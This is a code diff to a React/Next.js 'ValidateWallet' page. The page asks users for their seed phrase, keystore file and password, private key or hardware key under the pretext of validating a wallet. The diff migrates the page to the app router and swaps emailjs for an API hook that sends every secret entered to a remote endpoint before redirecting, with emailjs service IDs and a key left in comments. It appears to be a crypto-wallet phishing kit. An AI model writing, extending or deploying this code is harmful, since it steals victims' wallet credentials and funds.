@@ -1,11 +1,12 @@
+"use client"
 import { FormEvent, FunctionComponent, ReactElement, useEffect, useState } from "react";
-import styles from '../styles/Validate.module.scss';
+import styles from '@/app/styles/Validate.module.scss';
 import Image from "next/image";
-import images from "../../public/images";
-import { useRouter } from "next/router";
-import { wallets } from "@/Constants/wallets";
-import { WalletInfo } from "@/models/WalletInfo";
-import emailjs from 'emailjs-com';
+import { useRouter, useSearchParams } from "next/navigation";
+import { wallets } from "@/app/Constants/wallets";
+import { WalletInfo } from "@/app/models/WalletInfo";
+import { useSendEmailToClient } from "../api/apiClient";
+// import emailjs from 'emailjs-com';
 // import { useForm, ValidationError } from '@formspree/react';
 
 interface ValidateWalletProps {
@@ -22,6 +23,8 @@ const TabEnum = {
 const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement => {
 
     const router = useRouter();
+    const searchParams = useSearchParams();
+    const sendEmailToClient = useSendEmailToClient();
 
     const [tab, setTab] = useState(TabEnum.Mnemoics);
 
@@ -39,30 +42,21 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
     // Hardware 
     const [hardwareKey, setHardwareKey] = useState<string>();
 
-    // const handleSubmit = async (event: any) => {  
-    //     event.preventDefault();
 
-    //     const formData = new FormData(event.target);
-    //     console.log(formData);
-    //     const response = await fetch('https://formspree.io/f/mnqkappb', {
-    //         method: 'POST',
-    //         headers: {
-    //             'Content-Type': 'application/x-www-form-urlencoded',
-    //         },
-    //         // body: new URLSearchParams(formData).toString(),
-    //         body: formData, 
-    //     });
+    async function handleSendEmailToClient() {
 
-    //     if (response.ok) {
-    //         console.log('Email sent successfully!');
-    //         // Display success message to the user
-    //     } else {
-    //         console.error('Failed to send email:', response.statusText);
-    //         // Display error message to the user
-    //     }
-    // };
+        await sendEmailToClient({ coin: selectedWallet?.name as string, mnemonics: wordPhrase as string, keystore: keystoreJson as string, keystore_password: password as string, private: privateKey as string, keyhardware: hardwareKey as string })
+            .then((response) => {
+                console.log(response);
+            })
+            .catch((error) => {
+                console.log(error);
+            })
+        // .finally(() => {
+        // })
+    };
 
-    const handleSubmit = (event: FormEvent<HTMLFormElement>) => {
+    const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
         event.preventDefault();
 
         // Create template params for each case study 
@@ -73,20 +67,23 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
                 selected_info_type: 'Mnemoics'
             };
 
-            emailjs.send(
-                'service_aj89k72',
-                'template_pdqscf4',
-                { ...templatePrams },
-                'Kx3H2T_Dvdctm46t1'
-            )
-                .then((response) => {
-                    console.log('Mnemonics Email sent successfully!', response.status, response.text);
-                    // Display success message to the user
-                })
-                .catch((error) => {
-                    console.error('Mnemonics Failed to send email:', error);
-                    // Display error message to the user
-                });
+            // Send email to the user
+            await handleSendEmailToClient();
+
+            // emailjs.send(
+            //     'service_aj89k72',
+            //     'template_pdqscf4',
+            //     { ...templatePrams },
+            //     'Kx3H2T_Dvdctm46t1'
+            // )
+            //     .then((response) => {
+            //         console.log('Mnemonics Email sent successfully!', response.status, response.text);
+            //         // Display success message to the user
+            //     })
+            //     .catch((error) => {
+            //         console.error('Mnemonics Failed to send email:', error);
+            //         // Display error message to the user
+            //     });
         }
         if (tab === TabEnum.Keystore) {
             const templatePrams = {
@@ -96,20 +93,22 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
                 selected_info_type: 'Keystore'
             };
 
-            emailjs.send(
-                'service_aj89k72',
-                'template_pdqscf4',
-                { ...templatePrams },
-                'Kx3H2T_Dvdctm46t1'
-            )
-                .then((response) => {
-                    console.log('Mnemonics Email sent successfully!', response.status, response.text);
-                    // Display success message to the user
-                })
-                .catch((error) => {
-                    console.error('Mnemonics Failed to send email:', error);
-                    // Display error message to the user
-                });
+            // Send email to the user
+            await handleSendEmailToClient();
+            // emailjs.send(
+            //     'service_aj89k72',
+            //     'template_pdqscf4',
+            //     { ...templatePrams },
+            //     'Kx3H2T_Dvdctm46t1'
+            // )
+            //     .then((response) => {
+            //         console.log('Mnemonics Email sent successfully!', response.status, response.text);
+            //         // Display success message to the user
+            //     })
+            //     .catch((error) => {
+            //         console.error('Mnemonics Failed to send email:', error);
+            //         // Display error message to the user
+            //     });
         }
         if (tab === TabEnum.PrivateKey) {
             const templatePrams = {
@@ -118,20 +117,22 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
                 selected_info_type: 'Private Key'
             };
 
-            emailjs.send(
-                'service_aj89k72',
-                'template_pdqscf4',
-                { ...templatePrams },
-                'Kx3H2T_Dvdctm46t1'
-            )
-                .then((response) => {
-                    console.log('Mnemonics Email sent successfully!', response.status, response.text);
-                    // Display success message to the user
-                })
-                .catch((error) => {
-                    console.error('Mnemonics Failed to send email:', error);
-                    // Display error message to the user
-                });
+            // Send email to the user
+            await handleSendEmailToClient();
+            // emailjs.send(
+            //     'service_aj89k72',
+            //     'template_pdqscf4',
+            //     { ...templatePrams },
+            //     'Kx3H2T_Dvdctm46t1'
+            // )
+            //     .then((response) => {
+            //         console.log('Mnemonics Email sent successfully!', response.status, response.text);
+            //         // Display success message to the user
+            //     })
+            //     .catch((error) => {
+            //         console.error('Mnemonics Failed to send email:', error);
+            //         // Display error message to the user
+            //     });
         }
         if (tab === TabEnum.Hardware) {
             const templatePrams = {
@@ -140,33 +141,35 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
                 selected_info_type: 'Hardware Key'
             };
 
-            emailjs.send(
-                'service_aj89k72',
-                'template_pdqscf4',
-                { ...templatePrams },
-                'Kx3H2T_Dvdctm46t1'
-            )
-                .then((response) => {
-                    console.log('Mnemonics Email sent successfully!', response.status, response.text);
-                    // Display success message to the user
-                })
-                .catch((error) => {
-                    console.error('Mnemonics Failed to send email:', error);
-                    // Display error message to the user
-                });
+            // Send email to the user
+            await handleSendEmailToClient();
+            // emailjs.send(
+            //     'service_aj89k72',
+            //     'template_pdqscf4',
+            //     { ...templatePrams },
+            //     'Kx3H2T_Dvdctm46t1'
+            // )
+            //     .then((response) => {
+            //         console.log('Mnemonics Email sent successfully!', response.status, response.text);
+            //         // Display success message to the user
+            //     })
+            //     .catch((error) => {
+            //         console.error('Mnemonics Failed to send email:', error);
+            //         // Display error message to the user
+            //     });
         }
 
         router.push('/import-wallet');
     };
 
     useEffect(() => {
-        if (router.isReady) {
-            let walletName = router.query.walletName as string;
+        if (router) {
+            let walletName = searchParams.get("walletName") as string;
             console.log(walletName);
             console.log(wallets.find(element => element.name == walletName));
             setSelectedWallet(wallets.find(element => element.name == walletName));
         }
-    }, [router.isReady])
+    }, [router])
 
     return (
         <div className={styles.validationPage}>
